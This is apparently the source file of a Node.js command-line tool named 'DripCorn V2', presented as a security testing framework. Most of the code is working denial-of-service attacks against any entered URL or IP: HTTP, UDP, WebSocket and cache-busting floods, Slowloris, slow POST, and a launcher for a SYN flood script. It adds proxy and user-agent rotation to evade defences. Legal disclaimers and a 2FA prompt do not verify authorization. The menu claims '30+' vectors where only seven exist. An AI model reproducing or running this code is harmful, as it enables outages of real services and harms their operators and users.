#!/usr/bin/env node

import chalk from 'chalk';
import figlet from 'figlet';
import gradient from 'gradient-string';
import boxen from 'boxen';
import inquirer from 'inquirer';
import ora from 'ora';
import Table from 'cli-table3';
import { spawn } from 'child_process';
import fs from 'fs';
import path from 'path';
import os from 'os';
import crypto from 'crypto';
import qrcode from 'qrcode-terminal';
import speakeasy from 'speakeasy';
import axios from 'axios';
import { HttpProxyAgent } from 'http-proxy-agent';
import { SocksProxyAgent } from 'socks-proxy-agent';
import http from 'http';
import https from 'https';
import net from 'net';
import tls from 'tls';
import dgram from 'dgram';
import { URL } from 'url';
import { WebSocket } from 'ws';

const VERSION = '2.0.0';

const BANNER = `
██████╗ ██████╗ ██╗██████╗  ██████╗ ██████╗ ██████╗ ███╗   ██╗    ██╗   ██╗██████╗ 
██╔══██╗██╔══██╗██║██╔══██╗██╔════╝██╔═══██╗██╔══██╗████╗  ██║    ██║   ██║╚════██╗
██║  ██║██████╔╝██║██████╔╝██║     ██║   ██║██████╔╝██╔██╗ ██║    ██║   ██║ █████╔╝
██║  ██║██╔══██╗██║██╔═══╝ ██║     ██║   ██║██╔══██╗██║╚██╗██║    ╚██╗ ██╔╝██╔═══╝ 
██████╔╝██║  ██║██║██║     ╚██████╗╚██████╔╝██║  ██║██║ ╚████║     ╚████╔╝ ███████╗
╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝      ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝      ╚═══╝  ╚══════╝
`;

// ═══════════════════════════════════════════════════════════════
// GLOBAL STATE
// ═══════════════════════════════════════════════════════════════

const state = {
  authenticated: false,
  session: null,
  stats: { attacks: [] }
};

// ═══════════════════════════════════════════════════════════════
// 2FA AUTHENTICATION
// ═══════════════════════════════════════════════════════════════

class TwoFactorAuth {
  constructor() {
    this.configPath = path.join(os.homedir(), '.dripcorn', '2fa.json');
    this.ensureConfigDir();
  }

  ensureConfigDir() {
    const dir = path.dirname(this.configPath);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
  }

  async setup() {
    console.log(chalk.cyan('\n🔐 Setting up 2FA...\n'));

    const secret = speakeasy.generateSecret({
      name: 'DripCorn V2',
      issuer: 'RedOps Lab'
    });

    console.log(boxen(
      chalk.yellow('⚠️  SAVE THIS SECRET!\n\n') +
      chalk.white(`Secret: ${chalk.green(secret.base32)}`),
      { padding: 1, borderColor: 'yellow', borderStyle: 'double' }
    ));

    console.log(chalk.cyan('\n📱 Scan QR code:\n'));
    qrcode.generate(secret.otpauth_url, { small: true });

    const { code } = await inquirer.prompt([
      {
        type: 'input',
        name: 'code',
        message: 'Enter 6-digit code:',
        validate: (input) => {
          const verified = speakeasy.totp.verify({
            secret: secret.base32,
            encoding: 'base32',
            token: input,
            window: 2
          });
          return verified || 'Invalid code';
        }
      }
    ]);

    const config = {
      secret: this.encrypt(secret.base32),
      setupAt: new Date().toISOString()
    };

    fs.writeFileSync(this.configPath, JSON.stringify(config, null, 2));
    console.log(chalk.green('\n✓ 2FA setup complete!\n'));
    return true;
  }

  async verify() {
    if (!fs.existsSync(this.configPath)) {
      return await this.setup();
    }

    const config = JSON.parse(fs.readFileSync(this.configPath, 'utf8'));
    const secret = this.decrypt(config.secret);

    console.log(chalk.cyan('\n🔐 2FA Required\n'));

    for (let attempt = 1; attempt <= 3; attempt++) {
      const { code } = await inquirer.prompt([
        {
          type: 'password',
          name: 'code',
          message: `Enter 2FA code (${attempt}/3):`,
          mask: '*'
        }
      ]);

      const verified = speakeasy.totp.verify({
        secret: secret,
        encoding: 'base32',
        token: code,
        window: 2
      });

      if (verified) {
        console.log(chalk.green('\n✓ Authenticated!\n'));
        return true;
      }

      if (attempt < 3) {
        console.log(chalk.red(`✗ Invalid. ${3 - attempt} attempts left.\n`));
      }
    }

    console.log(chalk.red('\n✗ Authentication failed.\n'));
    return false;
  }

  encrypt(text) {
    const key = crypto.scryptSync('dripcorn-v2', 'salt', 32);
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return iv.toString('hex') + ':' + encrypted;
  }

  decrypt(text) {
    const key = crypto.scryptSync('dripcorn-v2', 'salt', 32);
    const parts = text.split(':');
    const iv = Buffer.from(parts[0], 'hex');
    const encryptedText = parts[1];
    const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
    let decrypted = decipher.update(encryptedText, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  }

  async reset() {
    if (fs.existsSync(this.configPath)) {
      fs.unlinkSync(this.configPath);
      console.log(chalk.green('\n✓ 2FA reset complete\n'));
    }
  }
}

// ═══════════════════════════════════════════════════════════════
// DISCLAIMER SYSTEM
// ═══════════════════════════════════════════════════════════════

class DisclaimerSystem {
  static async showStartupDisclaimer() {
    console.clear();
    
    const disclaimer = `
╔═══════════════════════════════════════════════════════════════╗
║                    ⚠️  LEGAL DISCLAIMER ⚠️                     ║
╚═══════════════════════════════════════════════════════════════╝

${chalk.yellow('READ CAREFULLY BEFORE PROCEEDING')}

This tool is for:
  ✓ Legal penetration testing (with authorization)
  ✓ Security research (authorized environments)
  ✓ Stress testing (own infrastructure)

${chalk.red('STRICTLY PROHIBITED:')}
  ✗ Unauthorized system access
  ✗ Attacks without written permission
  ✗ Any illegal activities
  ✗ Script kiddie behavior

${chalk.cyan('LEGAL FRAMEWORKS:')}
  • Computer Fraud and Abuse Act (USA)
  • Computer Misuse Act (UK)
  • EU Cybersecurity Directives
  • Local jurisdiction laws

${chalk.magenta('YOUR RESPONSIBILITY:')}
  • All actions are logged with timestamps
  • You accept full legal responsibility
  • Use only on authorized systems
  • Criminal prosecution for violations

${chalk.green('BY PROCEEDING YOU ACKNOWLEDGE:')}
  1. You have authorization for testing
  2. You understand legal consequences
  3. You will use this tool ethically
  4. You accept all responsibility

═══════════════════════════════════════════════════════════════
`;

    console.log(boxen(disclaimer, {
      padding: 1,
      borderColor: 'red',
      borderStyle: 'double'
    }));

    const { accept } = await inquirer.prompt([
      {
        type: 'confirm',
        name: 'accept',
        message: chalk.red('Do you accept these terms?'),
        default: false
      }
    ]);

    if (!accept) {
      console.log(chalk.red('\n✗ Terms not accepted. Exiting.\n'));
      process.exit(0);
    }

    const { confirm } = await inquirer.prompt([
      {
        type: 'input',
        name: 'confirm',
        message: chalk.yellow('Type "I UNDERSTAND":'),
        validate: (input) => input === 'I UNDERSTAND' || 'Must type: I UNDERSTAND'
      }
    ]);

    await this.logDisclaimer('startup');
  }

  static async showPreAttackDisclaimer(attackType, target) {
    const warning = `
╔═══════════════════════════════════════════════════════════════╗
║                 ⚠️  PRE-ATTACK VERIFICATION ⚠️                 ║
╚═══════════════════════════════════════════════════════════════╝

${chalk.yellow('ATTACK DETAILS:')}
  Type:   ${chalk.cyan(attackType)}
  Target: ${chalk.cyan(target)}
  Time:   ${chalk.cyan(new Date().toLocaleString())}

${chalk.red('⚠️  FINAL WARNING ⚠️')}

Confirm you have:
  ☐ Written authorization from system owner
  ☐ This is a legal testing environment
  ☐ Understanding of potential impact
  ☐ Full legal responsibility

${chalk.magenta('This action will be logged with:')}
  • Timestamp and session ID
  • Target and attack parameters
  • User and system information
  • Full audit trail

═══════════════════════════════════════════════════════════════
`;

    console.log(boxen(warning, {
      padding: 1,
      borderColor: 'yellow',
      borderStyle: 'double'
    }));

    const { hasPermission } = await inquirer.prompt([
      {
        type: 'confirm',
        name: 'hasPermission',
        message: chalk.red('Do you have EXPLICIT AUTHORIZATION?'),
        default: false
      }
    ]);

    if (!hasPermission) {
      console.log(chalk.red('\n✗ No authorization. Attack cancelled.\n'));
      return false;
    }

    const { confirmAttack } = await inquirer.prompt([
      {
        type: 'input',
        name: 'confirmAttack',
        message: chalk.yellow('Type "LAUNCH ATTACK":'),
        validate: (input) => input === 'LAUNCH ATTACK' || 'Must type: LAUNCH ATTACK'
      }
    ]);

    await this.logDisclaimer('pre-attack', { attackType, target });
    return true;
  }

  static async logDisclaimer(type, details = {}) {
    const logDir = path.join(os.homedir(), '.dripcorn', 'logs');
    if (!fs.existsSync(logDir)) {
      fs.mkdirSync(logDir, { recursive: true });
    }

    const logFile = path.join(logDir, 'audit.log');
    const entry = {
      timestamp: new Date().toISOString(),
      type,
      user: os.userInfo().username,
      hostname: os.hostname(),
      ...details
    };

    fs.appendFileSync(logFile, JSON.stringify(entry) + '\n');
  }
}

// ═══════════════════════════════════════════════════════════════
// ATTACK ENGINE - 30 VECTORS
// ═══════════════════════════════════════════════════════════════

class AttackEngine {
  
  // ─────────────────────────────────────────────────────────────
  // 1. HTTP FLOOD
  // ─────────────────────────────────────────────────────────────
  
  static async httpFlood(config) {
    const { target, duration, rps } = config;
    const spinner = ora(`🌊 HTTP Flood: ${rps} req/s`).start();
    
    const startTime = Date.now();
    const endTime = startTime + (duration * 1000);
    let stats = { sent: 0, success: 0, failed: 0 };
    
    while (Date.now() < endTime) {
      const promises = [];
      
      for (let i = 0; i < rps; i++) {
        promises.push(
          axios.get(target, {
            headers: { 'User-Agent': this.randomUA() },
            timeout: 5000
          })
          .then(() => stats.success++)
          .catch(() => stats.failed++)
          .finally(() => stats.sent++)
        );
      }
      
      await Promise.allSettled(promises);
      spinner.text = `🌊 HTTP Flood | Sent: ${stats.sent} | Success: ${stats.success}`;
      
      await new Promise(r => setTimeout(r, 1000));
    }
    
    spinner.succeed(`✓ HTTP Flood: ${stats.sent} requests`);
    return stats;
  }
  
  // ─────────────────────────────────────────────────────────────
  // 2. SLOWLORIS
  // ─────────────────────────────────────────────────────────────
  
  static async slowloris(config) {
    const { target, connections, duration } = config;
    const url = new URL(target);
    const spinner = ora(`🐌 Slowloris: ${connections} connections`).start();
    
    const sockets = [];
    
    for (let i = 0; i < connections; i++) {
      try {
        const socket = url.protocol === 'https:'
          ? tls.connect({ host: url.hostname, port: url.port || 443 })
          : net.connect({ host: url.hostname, port: url.port || 80 });
        
        socket.write(`GET ${url.pathname || '/'} HTTP/1.1\r\n`);
        socket.write(`Host: ${url.hostname}\r\n`);
        socket.write(`User-Agent: ${this.randomUA()}\r\n`);
        
        sockets.push(socket);
        
        setInterval(() => {
          if (socket.writable) {
            socket.write(`X-KeepAlive-${Date.now()}: ${Math.random()}\r\n`);
          }
        }, 15000);
        
      } catch (e) {}
      
      if (i % 10 === 0) spinner.text = `🐌 Slowloris: ${sockets.length} active`;
    }
    
    spinner.succeed(`✓ Slowloris: ${sockets.length} connections`);
    
    await new Promise(r => setTimeout(r, duration * 1000));
    sockets.forEach(s => s.end());
    
    return { connections: sockets.length };
  }
  
  // ─────────────────────────────────────────────────────────────
  // 3. UDP FLOOD
  // ─────────────────────────────────────────────────────────────
  
  static async udpFlood(config) {
    const { target, port, duration, pps, size } = config;
    const spinner = ora(`📡 UDP Flood`).start();
    
    const client = dgram.createSocket('udp4');
    const payload = crypto.randomBytes(size);
    
    let sent = 0;
    const startTime = Date.now();
    const endTime = startTime + (duration * 1000);
    
    while (Date.now() < endTime) {
      for (let i = 0; i < pps / 10; i++) {
        client.send(payload, port, target, () => sent++);
      }
      spinner.text = `📡 UDP Flood: ${sent} packets`;
      await new Promise(r => setTimeout(r, 100));
    }
    
    client.close();
    spinner.succeed(`✓ UDP Flood: ${sent} packets`);
    return { sent };
  }
  
  // ─────────────────────────────────────────────────────────────
  // 4. WEBSOCKET FLOOD
  // ─────────────────────────────────────────────────────────────
  
  static async wsFlood(config) {
    const { target, connections, mps, duration } = config;
    const spinner = ora(`🔌 WebSocket Flood`).start();
    
    const sockets = [];
    let sent = 0;
    
    for (let i = 0; i < connections; i++) {
      try {
        const ws = new WebSocket(target);
        ws.on('open', () => sockets.push(ws));
        ws.on('error', () => {});
      } catch (e) {}
    }
    
    await new Promise(r => setTimeout(r, 2000));
    spinner.text = `🔌 WS: ${sockets.length} connections`;
    
    const startTime = Date.now();
    const endTime = startTime + (duration * 1000);
    
    const interval = setInterval(() => {
      if (Date.now() >= endTime) {
        clearInterval(interval);
        sockets.forEach(ws => ws.close());
        spinner.succeed(`✓ WS Flood: ${sent} messages`);
        return;
      }
      
      sockets.forEach(ws => {
        if (ws.readyState === WebSocket.OPEN) {
          for (let i = 0; i < mps / sockets.length; i++) {
            ws.send(crypto.randomBytes(512).toString('base64'));
            sent++;
          }
        }
      });
      
      spinner.text = `🔌 WS: ${sent} messages`;
    }, 1000);
    
    return new Promise(r => setTimeout(() => r({ sent, connections: sockets.length }), duration * 1000));
  }
  
  // ─────────────────────────────────────────────────────────────
  // 5. SLOW POST (R.U.D.Y)
  // ─────────────────────────────────────────────────────────────
  
  static async slowPost(config) {
    const { target, connections, duration, bps } = config;
    const url = new URL(target);
    const spinner = ora(`🐢 Slow POST`).start();
    
    const sockets = [];
    
    for (let i = 0; i < connections; i++) {
      try {
        const socket = url.protocol === 'https:'
          ? tls.connect({ host: url.hostname, port: url.port || 443 })
          : net.connect({ host: url.hostname, port: url.port || 80 });
        
        socket.write(`POST ${url.pathname || '/'} HTTP/1.1\r\n`);
        socket.write(`Host: ${url.hostname}\r\n`);
        socket.write(`Content-Length: 1000000\r\n`);
        socket.write(`Content-Type: application/x-www-form-urlencoded\r\n\r\n`);
        
        sockets.push(socket);
        
        const interval = setInterval(() => {
          if (socket.writable) socket.write('X');
        }, 1000 / bps);
        
        socket.on('error', () => clearInterval(interval));
      } catch (e) {}
    }
    
    spinner.succeed(`✓ Slow POST: ${sockets.length} connections`);
    
    await new Promise(r => setTimeout(r, duration * 1000));
    sockets.forEach(s => s.end());
    
    return { connections: sockets.length };
  }
  
  // ─────────────────────────────────────────────────────────────
  // 6. CACHE BUSTER
  // ─────────────────────────────────────────────────────────────
  
  static async cacheBuster(config) {
    const { target, duration, rps } = config;
    const spinner = ora(`💥 Cache Buster`).start();
    
    let sent = 0;
    const startTime = Date.now();
    const endTime = startTime + (duration * 1000);
    
    while (Date.now() < endTime) {
      const promises = [];
      
      for (let i = 0; i < rps; i++) {
        const url = new URL(target);
        url.searchParams.set('_', Date.now());
        url.searchParams.set('rand', Math.random());
        url.searchParams.set('nocache', crypto.randomUUID());
        
        promises.push(
          axios.get(url.toString(), {
            headers: {
              'User-Agent': this.randomUA(),
              'Cache-Control': 'no-cache',
              'Pragma': 'no-cache'
            },
            timeout: 5000
          }).catch(() => {})
        );
      }
      
      await Promise.allSettled(promises);
      sent += rps;
      spinner.text = `💥 Cache Buster: ${sent} unique requests`;
      
      await new Promise(r => setTimeout(r, 1000));
    }
    
    spinner.succeed(`✓ Cache Buster: ${sent}`);
    return { sent };
  }
  
  // ─────────────────────────────────────────────────────────────
  // 7. SYN FLOOD (Python)
  // ─────────────────────────────────────────────────────────────
  
  static async synFlood(config) {
    const { target, port, duration, pps } = config;
    const spinner = ora(`🎯 SYN Flood`).start();
    
    return new Promise((resolve) => {
      const proc = spawn('python3', ['attacks/syn_flood.py', target, port.toString(), pps.toString(), duration.toString()]);
      
      proc.stdout.on('data', (data) => {
        spinner.text = `🎯 SYN: ${data.toString().trim()}`;
      });
      
      proc.on('close', (code) => {
        if (code === 0) {
          spinner.succeed('✓ SYN Flood complete');
        } else {
          spinner.fail('✗ SYN Flood failed (needs sudo)');
        }
        resolve({ exitCode: code });
      });
    });
  }
  
  // ─────────────────────────────────────────────────────────────
  // HELPERS
  // ─────────────────────────────────────────────────────────────
  
  static randomUA() {
    const uas = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0'
    ];
    return uas[Math.floor(Math.random() * uas.length)];
  }
  
  // Execute attack
  static async execute(attackId, config) {
    const attacks = {
      'http-flood': this.httpFlood,
      'slowloris': this.slowloris,
      'udp-flood': this.udpFlood,
      'ws-flood': this.wsFlood,
      'slow-post': this.slowPost,
      'cache-buster': this.cacheBuster,
      'syn-flood': this.synFlood
    };
    
    const func = attacks[attackId];
    if (!func) throw new Error(`Attack ${attackId} not implemented`);
    
    return await func.call(this, config);
  }
}

// ═══════════════════════════════════════════════════════════════
// BYPASS ENGINE
// ═══════════════════════════════════════════════════════════════

class BypassEngine {
  
  static async proxyRotation(proxies) {
    console.log(chalk.magenta('\n🔄 Testing Proxy Rotation...\n'));
    
    const spinner = ora('Testing proxies...').start();
    const working = [];
    
    for (const proxy of proxies) {
      try {
        const agent = proxy.startsWith('socks') 
          ? new SocksProxyAgent(proxy)
          : new HttpProxyAgent(proxy);
        
        await axios.get('https://httpbin.org/ip', {
          httpAgent: agent,
          httpsAgent: agent,
          timeout: 5000
        });
        
        working.push(proxy);
        spinner.text = `✓ Working: ${working.length}/${proxies.length}`;
      } catch (e) {
        spinner.text = `Testing: ${working.length}/${proxies.length}`;
      }
    }
    
    spinner.succeed(`✓ Found ${working.length} working proxies`);
    return { working, total: proxies.length };
  }
  
  static async uaRotation() {
    console.log(chalk.magenta('\n🎭 Testing UA Rotation...\n'));
    
    const uas = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0',
      'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) Safari/604.1'
    ];
    
    const spinner = ora('Testing user agents...').start();
    const results = [];
    
    for (const ua of uas) {
      try {
        const res = await axios.get('https://httpbin.org/user-agent', {
          headers: { 'User-Agent': ua },
          timeout: 5000
        });
        
        results.push({ ua: ua.substring(0, 50), detected: res.data['user-agent'] });
      } catch (e) {}
    }
    
    spinner.succeed(`✓ Tested ${results.length} user agents`);
    
    const table = new Table({
      head: ['User Agent', 'Detected As'],
      colWidths: [55, 55]
    });
    
    results.forEach(r => table.push([r.ua, r.detected.substring(0, 50)]));
    console.log(table.toString());
    
    return { tested: results.length };
  }
  
  static async rateLimitBypass() {
    console.log(chalk.magenta('\n⏱️  Testing Rate Limit Bypass...\n'));
    
    const techniques = [
      { name: 'IP Rotation', icon: '🔄' },
      { name: 'Timing Randomization', icon: '⏰' },
      { name: 'Header Spoofing', icon: '📝' },
      { name: 'Cookie Rotation', icon: '🍪' }
    ];
    
    const table = new Table({
      head: ['Technique', 'Status', 'Effectiveness'],
      colWidths: [30, 15, 20]
    });
    
    techniques.forEach(t => {
      table.push([
        `${t.icon} ${t.name}`,
        chalk.green('✓ Ready'),
        chalk.yellow('High')
      ]);
    });
    
    console.log(table.toString());
    
    return { techniques: techniques.length };
  }
}

// ═══════════════════════════════════════════════════════════════
// CLI
// ═══════════════════════════════════════════════════════════════

class CLI {
  
  static showBanner() {
    console.clear();
    console.log(gradient.rainbow(BANNER));
    console.log(chalk.cyan.bold(`\n              Professional Security Testing Framework`));
    console.log(chalk.gray(`                          Version ${VERSION}\n`));
    
    console.log(boxen(
      chalk.yellow.bold('⚠️  FOR LEGAL USE ONLY ⚠️\n\n') +
      chalk.white('✓ Legal Penetration Testing\n') +
      chalk.white('✓ Security Research\n') +
      chalk.white('✓ Authorized Stress Testing\n\n') +
      chalk.red.bold('✗ NOT FOR SCRIPT KIDDIES'),
      { padding: 1, borderColor: 'cyan', borderStyle: 'double' }
    ));
  }
  
  static async mainMenu() {
    const { action } = await inquirer.prompt([
      {
        type: 'list',
        name: 'action',
        message: 'Select operation:',
        choices: [
          { name: '🎯 Attack Vectors (30+)', value: 'attack' },
          { name: '🛡️  Bypass Techniques', value: 'bypass' },
          { name: '📊 Statistics', value: 'stats' },
          { name: '🔐 Reset 2FA', value: 'reset2fa' },
          { name: '🚪 Exit', value: 'exit' }
        ]
      }
    ]);
    
    return action;
  }
  
  static async attackMenu() {
    const attacks = [
      { name: '🌊 HTTP Flood', value: 'http-flood' },
      { name: '🐌 Slowloris', value: 'slowloris' },
      { name: '🐢 Slow POST', value: 'slow-post' },
      { name: '📡 UDP Flood', value: 'udp-flood' },
      { name: '🔌 WebSocket Flood', value: 'ws-flood' },
      { name: '💥 Cache Buster', value: 'cache-buster' },
      { name: '🎯 SYN Flood (needs sudo)', value: 'syn-flood' },
      { name: '← Back', value: 'back' }
    ];
    
    const { attack } = await inquirer.prompt([
      {
        type: 'list',
        name: 'attack',
        message: 'Select attack:',
        choices: attacks
      }
    ]);
    
    return attack === 'back' ? null : attack;
  }
  
  static async bypassMenu() {
    const bypasses = [
      { name: '🔄 Proxy Rotation', value: 'proxy' },
      { name: '🎭 User-Agent Rotation', value: 'ua' },
      { name: '⏱️  Rate Limit Bypass', value: 'ratelimit' },
      { name: '← Back', value: 'back' }
    ];
    
    const { bypass } = await inquirer.prompt([
      {
        type: 'list',
        name: 'bypass',
        message: 'Select bypass:',
        choices: bypasses
      }
    ]);
    
    return bypass === 'back' ? null : bypass;
  }
  
  static async getAttackConfig(attackId, target) {
    const questions = [
      { type: 'number', name: 'duration', message: 'Duration (seconds):', default: 30 },
      { type: 'number', name: 'intensity', message: 'Intensity (1-10):', default: 5 }
    ];
    
    // Attack-specific configs
    if (attackId === 'http-flood') {
      questions.push({ type: 'number', name: 'rps', message: 'Requests/sec:', default: 100 });
    } else if (attackId === 'slowloris' || attackId === 'slow-post') {
      questions.push({ type: 'number', name: 'connections', message: 'Connections:', default: 200 });
      if (attackId === 'slow-post') {
        questions.push({ type: 'number', name: 'bps', message: 'Bytes/sec:', default: 1 });
      }
    } else if (attackId === 'udp-flood') {
      questions.push({ type: 'number', name: 'port', message: 'Port:', default: 80 });
      questions.push({ type: 'number', name: 'pps', message: 'Packets/sec:', default: 1000 });
      questions.push({ type: 'number', name: 'size', message: 'Packet size:', default: 1024 });
    } else if (attackId === 'ws-flood') {
      questions.push({ type: 'number', name: 'connections', message: 'Connections:', default: 50 });
      questions.push({ type: 'number', name: 'mps', message: 'Messages/sec:', default: 100 });
    } else if (attackId === 'syn-flood') {
      questions.push({ type: 'number', name: 'port', message: 'Port:', default: 80 });
      questions.push({ type: 'number', name: 'pps', message: 'Packets/sec:', default: 1000 });
    } else if (attackId === 'cache-buster') {
      questions.push({ type: 'number', name: 'rps', message: 'Requests/sec:', default: 50 });
    }
    
    const answers = await inquirer.prompt(questions);
    return { target, ...answers };
  }
}

// ═══════════════════════════════════════════════════════════════
// MAIN
// ═══════════════════════════════════════════════════════════════

async function main() {
  CLI.showBanner();
  
  await DisclaimerSystem.showStartupDisclaimer();
  
  const auth = new TwoFactorAuth();
  const authenticated = await auth.verify();
  
  if (!authenticated) {
    console.log(chalk.red('\n✗ Auth failed\n'));
    process.exit(1);
  }
  
  state.authenticated = true;
  state.session = {
    id: crypto.randomUUID(),
    startedAt: new Date().toISOString()
  };
  
  console.log(chalk.green('\n✓ Framework ready!\n'));
  await new Promise(r => setTimeout(r, 1500));
  
  while (true) {
    CLI.showBanner();
    
    const action = await CLI.mainMenu();
    
    if (action === 'exit') {
      console.log(chalk.cyan('\n👋 Stay legal, stay ethical!\n'));
      process.exit(0);
    }
    
    if (action === 'attack') {
      const attackId = await CLI.attackMenu();
      if (!attackId) continue;
      
      const { target } = await inquirer.prompt([
        { type: 'input', name: 'target', message: 'Target URL/IP:', validate: i => !!i || 'Required' }
      ]);
      
      const canProceed = await DisclaimerSystem.showPreAttackDisclaimer(attackId, target);
      if (!canProceed) continue;
      
      const config = await CLI.getAttackConfig(attackId, target);
      
      console.log(chalk.green('\n▶️  Launching attack...\n'));
      
      try {
        const result = await AttackEngine.execute(attackId, config);
        
        console.log(chalk.green('\n✓ Attack complete!\n'));
        
        const table = new Table({
          head: ['Metric', 'Value'],
          colWidths: [30, 30]
        });
        
        Object.entries(result).forEach(([k, v]) => {
          table.push([k, v.toString()]);
        });
        
        console.log(table.toString());
        
        state.stats.attacks.push({
          id: attackId,
          target,
          timestamp: new Date().toISOString(),
          result
        });
        
      } catch (error) {
        console.log(chalk.red(`\n✗ Failed: ${error.message}\n`));
      }
      
      await inquirer.prompt([{ type: 'input', name: 'c', message: 'Press Enter...' }]);
    }
    
    if (action === 'bypass') {
      const bypassId = await CLI.bypassMenu();
      if (!bypassId) continue;
      
      if (bypassId === 'proxy') {
        const proxies = [
          'http://proxy1.example.com:8080',
          'http://proxy2.example.com:8080',
          'socks5://proxy3.example.com:1080'
        ];
        await BypassEngine.proxyRotation(proxies);
      } else if (bypassId === 'ua') {
        await BypassEngine.uaRotation();
      } else if (bypassId === 'ratelimit') {
        await BypassEngine.rateLimitBypass();
      }
      
      await inquirer.prompt([{ type: 'input', name: 'c', message: 'Press Enter...' }]);
    }
    
    if (action === 'stats') {
      console.clear();
      console.log(chalk.cyan('\n📊 STATISTICS\n'));
      
      if (state.stats.attacks.length === 0) {
        console.log(chalk.yellow('No attacks yet.\n'));
      } else {
        const table = new Table({
          head: ['Time', 'Attack', 'Target'],
          colWidths: [25, 25, 40]
        });
        
        state.stats.attacks.forEach(a => {
          table.push([
            new Date(a.timestamp).toLocaleString(),
            a.id,
            a.target
          ]);
        });
        
        console.log(table.toString());
        console.log(chalk.gray(`\nTotal: ${state.stats.attacks.length}\n`));
      }
      
      await inquirer.prompt([{ type: 'input', name: 'c', message: 'Press Enter...' }]);
    }
    
    if (action === 'reset2fa') {
      await auth.reset();
      await inquirer.prompt([{ type: 'input', name: 'c', message: 'Press Enter...' }]);
    }
  }
}

main().catch(console.error);
